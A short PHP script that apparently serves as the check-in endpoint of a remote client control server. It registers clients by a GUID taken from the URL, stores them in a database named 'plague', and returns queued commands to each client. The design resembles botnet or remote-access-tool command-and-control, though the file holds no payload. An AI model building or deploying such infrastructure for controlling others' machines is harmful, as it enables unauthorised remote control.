<?php
include('data.php');

if(!isset($_GET['GUID'])){
	http_response_code(400);
	die('GUID not set.');
} else $GUID = $_GET['GUID'];

if(!isset($_GET['silent'])){
	$Silent = false;
} else $Silent = true;

if(!ConnectDB('plague')){
	http_response_code(500);
	die('Failed to connect to the database.');
}

if(!$Silent)
if(!ClientExists($GUID)){
	RegisterClient($GUID);
	QueueCommand($GUID, 'Register', array(), array());
}

echo(GetCommands($GUID, $Silent));

?>